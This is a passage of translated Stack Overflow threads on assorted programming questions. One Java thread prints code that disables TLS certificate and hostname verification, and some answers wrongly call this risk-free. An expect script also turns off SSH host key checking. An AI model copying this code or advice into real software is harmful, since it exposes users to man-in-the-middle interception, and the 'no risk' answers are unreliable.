4.  添加被激活。你已经排序了。

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2012-10-25T20:25:49.990

关闭窗口并重新打开它，不要单击任何令牌。您将看到以下内容： ![在此处输入图像描述](../Images/f2346c64f6917cdcfb951b04727bf3a7.png)

如果您在此之前单击任何标记，添加按钮将被禁用。

或者

在您发布的屏幕截图中，只需在文本框中（在优先级下方）中重命名 UnresolvedConflict 并启用添加按钮。

# java - 禁用 Java 程序 SSL 认证的安全风险

> ID：13076511
> 
> 赞同：1
> 
> 时间：2012-10-25T20:13:35.743
> 
> 标签：java, security, https

我们的团队会抓取网站以使我们的信息保持最新。我[在抓取 HTTPS 页面时遇到了安全异常](https://stackoverflow.com/questions/13073285/response-failing-over-https-in-java/13073621#13073621)。问题是 Java 在接受来自页面的自签名证书时遇到问题。

我没有保留要接受的证书列表（将来可能难以维护），而是使用 neu242 提供的解决方法来[禁用 SSL 证书验证](https://stackoverflow.com/questions/875467/java-client-certificates-over-https-ssl)。

```
public static void disableCertificateValidation() 
{
    // Create a trust manager that does not validate certificate chains
      TrustManager[] trustAllCerts = new TrustManager[] { 
        new X509TrustManager() {
          public X509Certificate[] getAcceptedIssuers() { 
            return new X509Certificate[0]; 
          }

        @Override
        public void checkClientTrusted(X509Certificate[] arg0, String arg1) throws CertificateException
        {
            // TODO Auto-generated method stub

        }
        @Override
        public void checkServerTrusted(X509Certificate[] arg0, String arg1) throws CertificateException
        {
            // TODO Auto-generated method stub

        }
      }};

      // Ignore differences between given hostname and certificate hostname
      HostnameVerifier hv = new HostnameVerifier() {

        @Override
        public boolean verify(String arg0, SSLSession arg1)
        {
            // TODO Auto-generated method stub
            return true;
        }
      };

      // Install the all-trusting trust manager
      try {
        SSLContext sc = SSLContext.getInstance("SSL");
        sc.init(null, trustAllCerts, new SecureRandom());
        HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
        HttpsURLConnection.setDefaultHostnameVerifier(hv);
      } catch (Exception e) {}
} 
```

当然，这会带来重大的安全风险。但是，如果我只将此代码与我的下载程序（下载图像和 pdf 文档的程序）一起使用，并且我没有使用该程序发送任何敏感信息，那么存在哪些安全风险？据我了解，此信任管理器将仅为正在运行的 JVM 设置（运行该程序的服务器不会在操作系统级别禁用证书验证）。此外，如果我对图像和文档的请求被截获，我的代码将尝试将响应分别形成图像或 pdf，并且不会启动任何恶意软件。我在某处遗漏了安全风险吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-25T20:26:44.010

您面临的风险是恶意服务器可能会将自己置于您和源服务器之间（这是一种中间人攻击）。换句话说，您会认为您从真实服务器接收文件，但实际上您会从盗版服务器接收文件。因此，这取决于文档的类型以及您对它们的处理方式...

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-25T20:15:36.660

您可以禁用证书验证。您的通信仍然是安全的，您只是无法验证服务器的身份。我没有看到任何问题。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-27T03:11:10.540

唯一现实的“拦截”场景是客户端计算机在无线网络上的随机位置，例如咖啡店。由于您的抓取服务器显然不是，因此实际上禁用证书验证的风险为零。

# php - PHP MSSQL VARCHAR 255 字符问题

> ID：13076514
> 
> 赞同：1
> 
> 时间：2012-10-25T20:13:45.627
> 
> 标签：php, sql, sql-server

**问题**：针对 VARCHAR(256+) 字段的 MSSQL 查询在 PHP 中仅返回 255 个字符，无论 VARCHAR 大小是否大于 255。

我在[这里](https://stackoverflow.com/questions/609386/can-php-and-mssql-library-select-more-than-256-characters-from-a-varchar-column)和[这里](https://bugs.php.net/bug.php?id=25544)看到了对解决方法的引用，其中解决方法基本上是将 VARCHAR 转换为 TEXT：

```
SELECT CAST(myField AS TEXT) AS myField FROM myTable 
```

但是，如果我有一堆查询，例如：

```
SELECT * FROM myTable 
```

我的意思是，当然，我可以查找所有这样的查询并执行以下操作：

```
SELECT CAST(myField AS TEXT) AS 'myField2', * FROM myTable 
```

并将随后的 PHP 变量从 myField 更新为 myField2，但这对于我拥有的应用程序来说是一项相当大的任务。更不用说我必须查找所有具有 VARCHAR(256+) 的表中的所有字段，然后在我的 PHP 应用程序中查找所有受影响的查询。

我们正在运行 PHP 5.2.17，我知道 MSSQL 不再受支持/开发。我在[这里](http://www.microsoft.com/en-us/download/details.aspx?id=20098)看到了 Microsoft 支持的 SQL Server 驱动程序，但我必须将我的 PHP 版本更新到 5.3.6 或 5.4。我不完全确定如果我进行升级会带来什么。另外，我们必须在 PHP 应用程序中将所有 mssql_connect() 更改为 sqlsrv_connect() 以及从 mssql 到 sqlsvr 版本的其他函数。

有谁知道任何其他解决方法（比如我可以从可靠来源下载的更新的 DbLib C API），所以我不必去修改我的 PHP 应用程序中的所有内容？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-12-06T17:47:57.983

编辑`/etc/freetds.conf`以将`tds version`设置更改为 8.0（如果您的服务器是 MS SQL Server 2000 或更高版本）或 7.0（如果使用 MS SQL Server 7），必要时取消注释设置。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-26T06:27:19.490

启动“MS SQL 管理工作室”

在这个窗口的主菜单查询\查询选项\中选择结果\文本，最后你会看到“每列中显示的最大字符数”默认为255，更改它。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-07-07T09:14:01.540

I know its an old question but I'm looking for the same answer today ;)

I tested this solution

```
select *, CAST(DESCRESTESA AS TEXT) AS DESCRESTESA from table_name 
```

and it worked out very well

# android - 是否可以将 AndEngine 与 SherlockActivity 一起使用？

> ID：13076516
> 
> 赞同：3
> 
> 时间：2012-10-25T20:14:06.037
> 
> 标签：android, class, actionbarsherlock, andengine, oncreate

我是 Android 开发的菜鸟，我想使用 AndEngine 开发一个游戏并使用 SherlockActionBar 进行导航。问题是 AndEngine 需要我扩展 SimpleBaseGameActivity 而 SherlockActionBar 需要扩展 SherlockActivity。我正在尝试使用嵌套类方法，但我不知道如何在 OnCreate 期间使 AndEngine 初始化。任何帮助是极大的赞赏。

--EDIT-- 我已经修改了 ActionBarSherlock 示例中的静态附件演示，但仍然无法弄清楚如何使其工作，因为现有的 AndEngine 演示代码中没有 OnCreate 方法。

```
public class WABActivity extends SimpleBaseGameActivity implements IOnMenuItemClickListener, OnCreateOptionsMenuListener {
ActionBarSherlock mSherlock = ActionBarSherlock.wrap(this);

private static final int CAMERA_WIDTH = 720;
private static final int CAMERA_HEIGHT = 480;

protected static final int MENU_RESET = 0;
protected static final int MENU_QUIT = MENU_RESET + 1;

private Camera mCamera;

protected Scene mMainScene;

private BitmapTextureAtlas mBitmapTextureAtlas;
private ITextureRegion mFaceTextureRegion;

private Font mFont;

protected MenuScene mMenuScene;

@Override
public EngineOptions onCreateEngineOptions() {
    this.mCamera = new Camera(0, 0, CAMERA_WIDTH, CAMERA_HEIGHT);

    return new EngineOptions(true, ScreenOrientation.LANDSCAPE_FIXED, new RatioResolutionPolicy(CAMERA_WIDTH, CAMERA_HEIGHT), this.mCamera);
}

@Override
public void onCreateResources() {
    FontFactory.setAssetBasePath("font/");

    final ITexture fontTexture = new BitmapTextureAtlas(this.getTextureManager(), 256, 256, TextureOptions.BILINEAR);
    this.mFont = FontFactory.createFromAsset(this.getFontManager(), fontTexture, this.getAssets(), "Plok.ttf", 48, true, android.graphics.Color.WHITE);
    this.mFont.load();

    BitmapTextureAtlasTextureRegionFactory.setAssetBasePath("gfx/");

    this.mBitmapTextureAtlas = new BitmapTextureAtlas(this.getTextureManager(), 64, 64, TextureOptions.BILINEAR);
    this.mFaceTextureRegion = BitmapTextureAtlasTextureRegionFactory.createFromAsset(this.mBitmapTextureAtlas, this, "face_box_menu.png", 0, 0);
    this.mBitmapTextureAtlas.load();

}

@Override
public Scene onCreateScene() {
    this.mEngine.registerUpdateHandler(new FPSLogger());

    this.mMenuScene = this.createMenuScene();

    /* Just a simple scene with an animated face flying around. */
    this.mMainScene = new Scene();
    this.mMainScene.setBackground(new Background(0.09804f, 0.6274f, 0.8784f));

    final Sprite face = new Sprite(0, 0, this.mFaceTextureRegion, this.getVertexBufferObjectManager());
    face.registerEntityModifier(new MoveModifier(30, 0, CAMERA_WIDTH - face.getWidth(), 0, CAMERA_HEIGHT - face.getHeight()));
    this.mMainScene.attachChild(face);

    setTheme(R.style.Theme_Sherlock); //<--Not sure if this goes here
    mSherlock.setUiOptions(ActivityInfo.UIOPTION_SPLIT_ACTION_BAR_WHEN_NARROW); //<--Not sure if this goes here
    mSherlock.setContentView(???); //<--How do I set ContentView? Do I need to set contentview?

    return this.mMainScene;
}

@Override
public boolean onKeyDown(final int pKeyCode, final KeyEvent pEvent) {
    if(pKeyCode == KeyEvent.KEYCODE_MENU && pEvent.getAction() == KeyEvent.ACTION_DOWN) {
        if(this.mMainScene.hasChildScene()) {
            /* Remove the menu and reset it. */
            this.mMenuScene.back();
        } else {
            /* Attach the menu. */
            this.mMainScene.setChildScene(this.mMenuScene, false, true, true);
        }
        return true;
    } else {
        return super.onKeyDown(pKeyCode, pEvent);
    }
}

@Override
public boolean onMenuItemClicked(final MenuScene pMenuScene, final IMenuItem pMenuItem, final float pMenuItemLocalX, final float pMenuItemLocalY) {
    switch(pMenuItem.getID()) {
        case MENU_RESET:
            /* Restart the animation. */
            this.mMainScene.reset();

            /* Remove the menu and reset it. */
            this.mMainScene.clearChildScene();
            this.mMenuScene.reset();
            return true;
        case MENU_QUIT:
            /* End Activity. */
            this.finish();
            return true;
        default:
            return false;
    }
}

protected MenuScene createMenuScene() {
    final MenuScene menuScene = new MenuScene(this.mCamera);

    final IMenuItem resetMenuItem = new ColorMenuItemDecorator(new TextMenuItem(MENU_RESET, this.mFont, "RESET", this.getVertexBufferObjectManager()), new Color(1,0,0), new Color(0,0,0));
    resetMenuItem.setBlendFunction(GLES20.GL_SRC_ALPHA, GLES20.GL_ONE_MINUS_SRC_ALPHA);
    menuScene.addMenuItem(resetMenuItem);

    final IMenuItem quitMenuItem = new ColorMenuItemDecorator(new TextMenuItem(MENU_QUIT, this.mFont, "QUIT", this.getVertexBufferObjectManager()), new Color(1,0,0), new Color(0,0,0));
    quitMenuItem.setBlendFunction(GLES20.GL_SRC_ALPHA, GLES20.GL_ONE_MINUS_SRC_ALPHA);
    menuScene.addMenuItem(quitMenuItem);

    menuScene.buildAnimations();

    menuScene.setBackgroundEnabled(false);

    menuScene.setOnMenuItemClickListener(this);
    return menuScene;
}

@Override
public boolean onCreateOptionsMenu(android.view.Menu menu) {
    return mSherlock.dispatchCreateOptionsMenu(menu);
}

 @Override
    public boolean onCreateOptionsMenu(Menu menu) {

        sub = menu.addSubMenu("Options");
        sub.add(0, 1, 0, "Settings");
        sub.getItem().setShowAsAction(MenuItem.SHOW_AS_ACTION_ALWAYS | MenuItem.SHOW_AS_ACTION_WITH_TEXT);      
        return true;
    }

    @Override //<-- Giving Error: must override or implement a supertype method
    public boolean onOptionsItemSelected(MenuItem item) {
        if (item.getItemId() == android.R.id.home || item.getItemId() == 0) {
            return false;
        }
        if(item.getItemId()==1){
            //SETTINGS SCREEN//
            sub.removeItem(1);
            sub.removeItem(2);
            sub.removeItem(3);
            sub.removeItem(4);
            sub.removeItem(5);
            sub.add(0, 5, 0, "Home");
            sub.add(0, 2, 0, "High Scores");
            sub.add(0, 3, 0, "Help");
            sub.add(0, 4, 0, "About");
            //mMode = startActionMode(new AnActionModeOfEpicProportions());
            }

        }

} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T21:57:47.247

查看 ActionBarSherlock 演示代码中包含的静态附件示例。静态附件正是为此目的而存在的。

# ruby-on-rails - 使用不同的设置多次运行相同的测试

> ID：13076518
> 
> 赞同：2
> 
> 时间：2012-10-25T20:14:18.803
> 
> 标签：ruby-on-rails, testunit, shoulda

有谁知道在不同情况下运行同一组测试的好方法。这是一个想用两种不同设置运行相同测试的荒谬示例。我不想为了可以有不同的设置而重复相同的测试。

```
context 'cat' do
  setup do
    @object = cat
    ....
  end

  should 'walk' do
    assert @object.walk?
    ...
  end

  should 'run' do
    assert @object.run?
    ...
  end
end

context 'dog' do
  setup do
    @object = dog
    ....
  end

  should 'walk' do
    assert @object.walk?
    ...
  end

  should 'run' do
    assert @object.run?
    ...
  end
end 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-25T20:33:22.500

我以前做过`merge_block`。在你的测试中定义一个类方法，它返回`Proc`你的一个应该，然后在适当的地方合并它。

```
def self.walk_and_run
  Proc.new do
    should 'walk' do
      assert @object.walk?
    end
    should 'run' do
      assert @object.run?
    end
  end
end

context 'cat' do
  setup do
    @object = cat
  end
  merge_block(&walk_and_run)
end

context 'dog' do
  setup do
    @object = dog
  end
  merge_block(&walk_and_run)
end 
```

# python - 使用循环添加切片数字

> ID：13076520
> 
> 赞同：0
> 
> 时间：2012-10-25T20:14:23.710
> 
> 标签：python, loops, slice

我想知道如何使用循环在 Python 中添加这些数字？谢谢

```
num=input("Enter your number: ")

ansAdd= int(str(num)[7])+int(str(num)[5])+int(str(num)[3])+int(str(num)[1])

print.... 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T20:20:56.607

```
>>> s = '01234567'
>>> sum(map(int, s[1::2]))
16 
```

下面是它的工作原理：

`s[1::2]``1`从 index 开始到字符串末尾逐行取一段字符串`2`。有关切片的更多信息，请参阅 Python 教程的[字符串](http://docs.python.org/tutorial/introduction.html#strings)部分。

[`map`](http://docs.python.org/library/functions.html#map)接受一个函数和一个[可迭代](http://docs.python.org/glossary.html#term-iterable)对象（字符串是可迭代的）并将该函数应用于每个项目，返回结果列表。在这里，我们使用`map`将每个字符串数字转换为`int`.

[`sum`](http://docs.python.org/library/functions.html#sum)接受一个可迭代对象并将其相加。

如果你想在没有`sum`和`map`内置函数、没有切片和显式 for 循环的情况下执行此操作：

```
>>> s = '01234567'
>>> total = 0
>>> for i in range(1, len(s), 2):
...     total += int(s[i])
...
>>> total
16 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-25T20:18:12.930

你想用循环来做，你去：

```
ansAdd = 0
for x in [7,5,3,1]:
  ansAdd += int(str(num)[x]) 
```

然而，使用列表推导更 Pythonic

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-25T20:19:00.350

```
>>> num=input()
12345678
>>> sum(map(int,num[:8][1::2]))
20 
```

这里`num[:8][1::2]`只返回所需的数字`sum()`，`num[:8]`确保只有达到 index`7`的元素用于计算并`[1::2]`返回`1,3,5,7`

```
>>> num[:8][1::2]
>>> '2468' 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-25T20:19:21.993

您似乎想对用户输入的奇数位求和。用循环来做到这一点：

```
num_str = raw_input("Enter your number: ")
ansAdd = 0
for digit in num_str[1::2]:
    ansAdd += int(digit) 
```

（语法`[1::2]`是 python 的[字符串切片](http://docs.python.org/tutorial/introduction.html#strings)——三个数字由它分隔`:`，表示开始索引、停止索引和步骤。省略的值告诉 python 尽可能多地抓取。）

有一种更好的方法可以在不使用传统循环的情况下做到这一点：

```
num_str = raw_input("Enter your number: ")
ansAdd = sum(int(digit) for digit in num_str[1::2]) 
```

在 python 2 中，`input`将输入的文本作为 python 代码执行并返回结果，这就是为什么你必须使用`str`.

在 python 2中使用它被认为存在安全风险`input`，因为您的脚本的用户可以输入任何有效的 python 代码，并且它将被执行，没有任何问题。在 python 3`raw_input`中已重命名为`input`，旧的`input`已删除（`eval(input())`改为使用）。

# linux - 期望脚本在文件中收集输出

> ID：13076521
> 
> 赞同：1
> 
> 时间：2012-10-25T20:14:24.690
> 
> 标签：linux, expect

我有以下期望脚本，它在远程主机上运行 /tmp/find_users.sh 脚本，我正在尝试收集该脚本的输出。

```
#!/usr/bin/expect

set timeout 3
if {[llength $argv] != 1} {
    puts "usage: ssh-auto host"
    exit 1
}

set host  [lindex $argv 0]
spawn ssh -t -q -oStrictHostKeyChecking=no $host
expect "passphrase"
send "XXXXXXX\r"
expect "$"
send  "/tmp/find_users.sh\r"
expect eof 
```

我正在使用以下方法来收集脚本的输出。

```
./auto-ssh.ex servername > command_output.txt 
```

问题在于输出其附加的服务器提示和横幅其他废话..我想要整洁的输出而不是废话..我确信有一个好方法，但我不知道如何。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-26T00:19:14.130

您可以编辑远程 shell 以将日志输出添加到文件中。并在期望脚本结束时使用 auto_scp 获取日志文件。

# c++ - 重载比较运算符

> ID：13076522
> 
> 赞同：2
> 
> 时间：2012-10-25T20:14:28.083
> 
> 标签：c++

我在重载比较运算符`>`和`<`. 我尝试了两种不同的方法，但我仍然遇到问题。

```
bool Car::operator ==(const Car &car)
{
    return mLNumber == car.GetNum();
}

bool Car::operator <(const Car &carB)
{
    return mLNumber < carB.GetNum(); 
}
bool Car::operator >(const Car &carB)
{
    return mLNumber > carB.GetNum(); 
}
int Car::GetNum()
{
    return mLNumber;
} 
```

我的`==`操作员工作得很好。我得到这些运算符不存在的错误。这是我的第二次尝试。

```
bool Car::operator <(const Car &carA, const Car &carB)
{
    return carA.GetNum() < carB.GetNum(); 
}
bool Car::operator >(const Car &carB)
{
    return carA.GetNum() > carB.GetNum(); 
} 
```

我得到参数太多的错误。我也明白了：

```
'Car::GetNum' : cannot convert 'this' pointer from 'const Car' to 'Car &' 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-25T20:18:02.087

尝试让您的运营商`const`：

```
bool Car::operator <(const Car &carB) const {
    return mLNumber < carB.GetNum(); 
}
bool Car::operator >(const Car &carB) const {
    return mLNumber > carB.GetNum(); 
} 
```

**编辑：**在这种情况下，您也应该制作该`GetNum()`函数，`const`因为您是在`const Car&`对象上调用它。

你也不需要`GetNum()`，你可以写

```
bool Car::operator <(const Car &carB) const {
    return mLNumber < carB.mLNumber; 
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-10-25T20:24:37.650

代码中有两个问题 -**首先**，从逻辑上讲，您的运算符在类型上是**不可变**的 - 它们不会更改对象，它们只分析它们，并且您应该能够在不可变 ( `const`) 对象上调用它们。因此，正如alestanis 指出的那样，**制作它们`const`**（所有运算符和getter 方法）。

**其次**，`<` `==`和`>`是二元运算符。实现它们有两种选择：作为自由运营商或作为成员。你和会员一起去，这没关系，但是：

```
bool Car::operator <(const Car &carA, const Car &carB) 
```

没有声明二元运算符。当您将运算符实现为成员时，第一个参数隐式为当前对象（`*this`），所以它应该是

```
bool Car::operator <(const Car &carB) const 
```

自由运算符看起来像：

```
bool operator < (const Car& carA, const Car& carB); 
```

请注意，`const`这没有意义，因为它不是成员。但是，请注意，第一个参数 ( `carA`) 被标记为 const，它对应于`const`应用于成员版本中的方法（在后台，标记`this`为`const`）。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-25T20:20:27.743

查看您在哪里调用这些运算符会有所帮助。

您的带有两个 Car 参数的第二个版本应该是全局运算符。所以如果你使用 Car:: 从定义中删除它们。也将声明移出 Car 类的主体。

由于您在 const Car 对象上调用 GetNum，因此 Car::GetNum 函数也需要为 const。更肮脏的方法是抛弃 const-ness，但这是不受欢迎的。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-10-25T20:21:15.750

在第一种情况下：

您的运算符不会更改操作数的数据，则应将其设为 const：

```
bool Car::operator <(const Car &carB) const {
                                    //^^^^^
    return mLNumber < carB.GetNum(); 
}
bool Car::operator >(const Car &carB) const {
                                   // ^^^^^
    return mLNumber > carB.GetNum(); 
}

int Car::GetNum() const
                //^^^^^
{
    return mLNumber;
} 
```

在第二种情况下，当运算符接受 2 个参数时，它们应该被实现为自由函数：

```
bool operator <(const Car &carA, const Car &carB)
{
    return carA.GetNum() < carB.GetNum(); 
}
bool operator >(const Car &carA, const Car &carB)
{
    return carA.GetNum() > carB.GetNum(); 
} 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-10-25T20:21:15.733

您的错误是当您想要比较一个`const`对象并且您的运算符未标记为时`const`，作为一般规则，您应该始终将不会更改您的对象的函数和运算符标记为`const`，这让生活变得更加轻松。例如：

```
bool Car::operator ==(const Car &car) const // <-- This function is const
{
    return mLNumber == car.GetNum();
} 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-10-25T20:21:26.307

问题是它`car::GetNum()`没有被声明`const`，所以你不能`const`在`car`. 运算符将 a`const Car &carB`作为参数，因此您不能调用`GetNum()`on `carB`，因为`carB`它是一个`const`对象，但`GetNum()`尚未声明`const`。

您应该养成将所有不修改对象的函数声明为`const`. 要将函数声明为`const`，只需`const`在右括号后附加即可。无论是在声明中，还是在定义中。例如：

```
class car {
    // ...
    void car::foo() const;
    // ...
};

void car::foo() const
{ /* ... */ } 
```

或者，如果您在类声明中内联定义它：

```
class car {
    // ...
    void car::foo() const
    { /* ... */ }
    // ...
}; 
```

虽然在这种特殊情况下不是绝对必要的（这意味着这不是代码无法编译的原因），但也应该`const`出于同样的原因声明运算符本身（以便您也可以在`const`对象上使用它们。）

# php - 在背景图像顶部旋转图像

> ID：13076524
> 
> 赞同：0
> 
> 时间：2012-10-25T20:14:36.990
> 
> 标签：php, php-gd

我有两张图片。一个是旋转的宝丽来框架的 jpg 图像`polaroid.jpg`。另一个只是一个普通的形象`image.jpg`。

我正在尝试旋转图像，然后将其放在宝丽来图像的顶部，然后将合并的图像显示为一张 jpg 图像。

我认为我与以下代码非常接近，但我无法让透明度正常工作。旋转图像的未覆盖区域是黑色而不是透明的。我究竟做错了什么？我在与获取顶部图像的透明背景相关的行中添加了注释。

```
$bg_src = "polaroid.jpg";

$img_src = "image.jpg";

$outputImage = imagecreatefromjpeg($bg_src);

$img = imagecreatefromjpeg($img_src);

// This should create transparent background.
$bgd_color = imagecolorallocatealpha($img, 0, 0, 0, 127); 

// This should assign the transparent background to the uncovered zone after rotation
$img = imagerotate($img, 10, $bgd_color);

// This should make sure the alpha transparency gets saved
imagesavealpha($img, true);

$img_x = imagesx($img);

$img_y = imagesy($img);

imagecopymerge($outputImage,$img,156,50,0,0,$img_x,$img_y,100);

header('Content-type: image/jpeg');

imagejpeg($outputImage);

imagedestroy($outputImage); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T21:59:19.807

经过一番折腾后想通了。结果很简单。我刚刚更改了这一行：

```
imagesavealpha($img, true); 
```

对此：

```
imagecolortransparent($img,$bgd_color); 
```

耶！:)

# batch-file - 我们如何在 net beans 项目中创建的 jar 文件停止构建后立即复制到某个文件夹？

> ID：13076532
> 
> 赞同：2
> 
> 时间：2012-10-25T20:14:57.197
> 
> 标签：batch-file, netbeans-7

我希望在项目构建完成后立即将项目的可执行 jar 文件复制到另一个文件夹位置。

我确实有一个批处理文件来执行此操作，但是我希望以这样的方式自动化它，以便在构建完成时执行它......！

我该怎么做 ？

请帮忙！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-26T01:03:17.053

我想通过编辑 Build.xml 文件可以尝试将文件自动复制到所需的位置。这是 Build.xml

```
<?xml version="1.0" encoding="UTF-8"?>
<project name="testBuildXml" default="default" basedir=".">
<description>Builds, tests, and runs the project testBuildXml.</description>
<import file="nbproject/build-impl.xml"/>
<property name="src"     value="<path-to-your-batch-file>"/>
<target name="**-post-jar**">
    <exec dir="${src}" executable="cmd.exe">
        <arg line="/c copy.bat"/>
    </exec>
</target>
</project> 
```

“-post-jar”允许批处理仅在 jar 构建过程完成后执行。如需更多信息，您可以查看此[网页](http://ant.apache.org/manual/Tasks/exec.html)。

# javascript - 为什么 type="number" 的输入没有显示其绑定值的更新？

> ID：13076536
> 
> 赞同：7
> 
> 时间：2012-10-25T20:15:05.030
> 
> 标签：javascript, html, angularjs

一组 HTML 输入控件绑定到 testVar：

```
<div ng-app>
    <div ng-controller="TestCtrl">
        <input type="text" ng-model="testVar">
        <input type="number" min="1" max="10" ng-model="testVar">
        <input type="range" min="1" max="10" ng-model="testVar">
        <button ng-click="testVar = 5">set to 5</button>              
    </div>
 </div> 
```

最初，所有输入控件都按预期显示此值，但是当通过 type="range" 或 type="text" 输入更改 testVar 时，type="number" 输入变为空白。以编程方式设置 testVar 的值会导致预期的行为：所有输入都显示更新后的值。

这个简单的案例证明了这个问题：http: [//jsfiddle.net/7cbYp/](http://jsfiddle.net/7cbYp/)

为什么会发生这种情况，如何解决？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-25T22:10:51.257

一个快速的解决方法是创建一个指令并观察模型和 HTML 项目本身的变化

HTML

```
<input type="number" min="1" max="10" fix="testVar"> 
```

JS

```
var App = angular.module('App', []);
App.directive('fix', function(){
    return{
        link: function(scope, elem, attrs){
            scope.$watch(attrs.fix, function(v){
                if(typeof v === 'string') v = parseInt(v, 10);
                elem.val(v);
            });
            elem.bind('change', function(){ 
                scope[attrs.fix] = elem.val(); 
                scope.$digest();
            });
        }
    };
}); 
```

我只在 Chrome 上测试过它，它可以工作。

jsfiddle：http: [//jsfiddle.net/jaimem/HLnqt/3/](http://jsfiddle.net/jaimem/HLnqt/3/)

*注意：必须有更清洁的方法来执行此操作。*

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-04-09T14:54:13.663

input[type=range] 将模型数据类型转换为字符串，不能在 input[type=number] 中显示。

与此处的解决方案类似的问题。

[角度数据绑定 - 输入类型 =“数字”](https://stackoverflow.com/questions/19404969/angular-data-binding-input-type-number)

# javascript - 用于开始 CSS 过渡的 requestAnimationFrame

> ID：13076540
> 
> 赞同：6
> 
> 时间：2012-10-25T20:15:13.363
> 
> 标签：javascript, html, animation, requestanimationframe

请求一个动画帧来开始 CSS 过渡是否有意义？

例如，[Mozilla CSS 转换页面](https://developer.mozilla.org/en-US/docs/CSS/Using_CSS_transitions)包含指向此[jsfiddle 示例](http://jsfiddle.net/RwtHn/5/)的链接：

CSS：

```
#foo{
    border-radius:50px;
    width:50px;
    height:50px;
    background:#c00;
    position:absolute;
    top:0;
    left:0;
    -moz-transition: all 1s;
    -webkit-transition: all 1s;  
    -ms-transition: all 1s;  
    -o-transition: all 1s;  
    transition: all 1s;  
} 
```

JavaScript：

```
var f = document.getElementById('foo');
document.addEventListener('click', function(ev){
    f.style.left = (ev.clientX-25)+'px';
    f.style.top = (ev.clientY-25)+'px';
},false); 
```

如下重写这个例子是否有意义？（见[这个 jsfiddle](http://jsfiddle.net/RwtHn/1486/)）

JavaScript：

```
var rAF = window.mozRequestAnimationFrame ||
          window.webkitRequestAnimationFrame;
var f = document.getElementById('foo');
document.addEventListener('click', function(ev){
    rAF(function() {
        f.style.left = (ev.clientX-25)+'px';
        f.style.top = (ev.clientY-25)+'px';
    });
},false); 
```

感谢您的任何回答。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2015-04-02T12:22:12.747

不，不是的。在现代浏览器中，所有动画、CSS 过渡、CSS 动画、SMIL、element.animate 都由同一个内部引擎控制。浏览器将在下一个可用帧上开始您的动画。RAF 和原生动画有不同的线程。RAF 用于 JavaScript 动画。该重写将只等待几毫秒，直到设置这些更改。之后，您的动画将由内部引擎控制。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2015-04-02T11:13:58.483

我知道问题很旧，但这可能对某人有用。

**rAF(requestAnimationFrame)**在这个例子中没有用。因为您正在使用 css 转换滑动元素并调用 rAF 一次。您必须通过逐帧调用 rAF 来循环道具更改，以通过浏览器优化 CPU、GPU 性能。

**关于 rAF 的主要思想：**

当你想在没有 css 动画的情况下为 dom 元素设置动画时，你必须定期更改元素的样式属性*（如宽度、高度、顶部、左侧等） 。*

如果没有 rAF，则必须使用 setTimeout、setInterval 函数来根据时间更改道具。但是浏览器不会优化这些进程，这对 CPU、GPU 性能来说可能是痛苦的。

当您使用 rAF 时，现代浏览器可以使用更少的 CPU、GPU 使用来优化动画性能。

有用的链接：

[智能动画的 requestAnimationFrame](http://www.paulirish.com/2011/requestanimationframe-for-smart-animating/)

[requestAnimationFrame](http://creativejs.com/resources/requestanimationframe/)

# javascript - 引号和自动换行

> ID：13076541
> 
> 赞同：0
> 
> 时间：2012-10-25T20:15:26.133
> 
> 标签：javascript, jquery, css, quotes, word-wrap

我正在尝试在这样的 DIV 中添加一些文本和引号

“一切都很好，就一切都好”

现在文本是动态生成的，我正在使用 javascript 字体替换插件（CUFON）作为文本周围的引号，有时由于像这样的自动换行，结束引号会下降到下一行

“一切都很好，就一切都好 ”

我怎样才能防止这种情况？我找不到阻止它的方法。代码看起来像这样

```
$("#q1").html('<span class="blue_quotes">“ </span>');
$("#ct1").html($.trim(commentText)+'<span class="blue_quotes">” </span>'); 
```

我为引号添加了跨度标签，因为我需要为引号使用不同的字体和颜色

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-25T20:25:17.477

您可以在这种情况下使用**转义序列 \** .. 但我更喜欢在这种情况下使用 unicodes ..

如果你想使用第一种方法试试这个

```
$("#q1").html('<span class="blue_quotes"> \“ </span>'); 
```

**[检查小提琴](http://jsfiddle.net/sushanth009/gqke8/)**

# vb.net - Visual Basic 中的 HTTP 获取请求

> ID：13076544
> 
> 赞同：1
> 
> 时间：2012-10-25T20:15:30.550
> 
> 标签：vb.net

我刚刚开始学习VB，所以我对VB完全陌生。

我已经创建了一个带有输入文本框和按钮的用户表单。我希望能够扫描条形码并将其实施到此链接中：`http://openean.kaufkauf.net/?ean=\[ean\]&cmd=query&queryid=200000000`替换`[ean]`为条形码中的数字。

然后发出 HTTP GET 请求并在消息框中弹出结果。我不知道如何获取文本框的值，将其粘贴到链接中并发出请求。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T22:15:41.657

假设您的文本框名为`TextBox1`，请尝试：

```
Dim request As String = String.Format("http://openean.kaufkauf.net/?ean={0}&cmd=query&queryid=200000000", TextBox1.Text)
